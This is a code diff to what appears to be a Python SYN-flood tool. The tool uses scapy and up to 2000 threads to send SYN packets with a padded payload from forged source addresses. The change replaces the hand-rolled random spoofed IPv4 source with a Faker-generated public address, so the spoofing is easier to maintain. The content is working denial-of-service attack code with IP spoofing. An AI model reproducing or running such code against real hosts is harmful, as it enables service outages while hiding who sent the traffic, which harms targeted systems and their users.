@@ -12,12 +12,15 @@ import random
 import sys
 import threading
 from scapy.all import *
+from faker import Faker
+
 
 target = None
 port = None
 thread_limit = 2000
 total = 0
 payload="A"*2000
+fake = Faker()
 
 class sendSYN(threading.Thread):
 	global target, port, payload
@@ -27,9 +30,7 @@ class sendSYN(threading.Thread):
 	def run(self):
 		#Layer 3 forging
 		ip = IP()
-		#Here comes the IP spoogin part, taking a big chunk of the
-		#usable public IPv4 space at random.
-		ip.src = "%i.%i.%i.%i" % (random.randint(193,222),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+		ip.src = fake.ipv4_public(network=False, address_class=None)
 		ip.dst = target
 
 		#Layer 4 forging
